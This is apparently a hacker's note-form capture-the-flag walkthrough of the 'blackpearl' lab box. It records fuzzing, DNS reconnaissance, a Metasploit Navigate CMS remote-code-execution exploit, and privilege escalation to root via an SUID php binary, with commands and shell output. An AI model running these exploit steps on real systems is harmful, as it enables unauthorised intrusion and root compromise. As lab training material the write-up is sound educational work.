for port 80:
	lets fuzz it: $ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://<VICTIM IP>/FUZZ
		returns secret -> says directory busting wont work... BUST. Moving on
		

		
		
for port 53:
	lets do recon: $ dnsrecon -r 127.0.0.0/24 -n <VICTIM IP> -d blah (-d for domain - we dont know)
	returns: 
			└─$ dnsrecon -r 127.0.0.0/24 -n <VICTIM IP> -d blah
			[*] Performing Reverse Lookup from 127.0.0.0 to 127.0.0.255
			[+]      PTR blackpearl.tcm 127.0.0.1

		lets add that dns to /etc/host on kali and go to http://blackpearl.tcm

	lets fuzz this...
		returns navigate -> navigate cms =>> has a lot of msfconsole hits on google (https://www.rapid7.com/db/modules/exploit/multi/http/navigate_cms_rce/)
		lets use msfconsole 
			set rhosts <VICTIM IP>
			set vhost blackpearl.tcm
				meterpreter > shell
				Process 686 created.
				Channel 1 created.
				whoami
				www-data
				
				lets generate a tty shell to see where we are with $ python -c 'import pty; pty.spawn("/bin/bash")' or /bin/sh
				
				lets give linpeas a try since we have to escalate privilege
				
				linpeas found this =>> -rwsr-xr-x 1 root root 4.6M Feb 13  2021 /usr/bin/php7.3 (Unknown SUID binary!)
				
				we can run this as root!!! Its in SUID using https://gtfobins.github.io/gtfobins/php/#suid
				
				lets try this /usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);" 
				
					www-data@blackpearl:~$ /usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
					/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
					# whoami
					whoami
					root
					# ls
					ls
					blackpearl.tcm  html
					# cd /root      
					cd /root
					# ls
					ls
					flag.txt
					# cat flag.txt
					cat flag.txt
					Good job on this one.
					Finding the domain name may have been a little guessy,
					but the goal of this box is mainly to teach about Virtual Host Routing which is used in a lot of CTF.
					
			ROOTED!!! :)
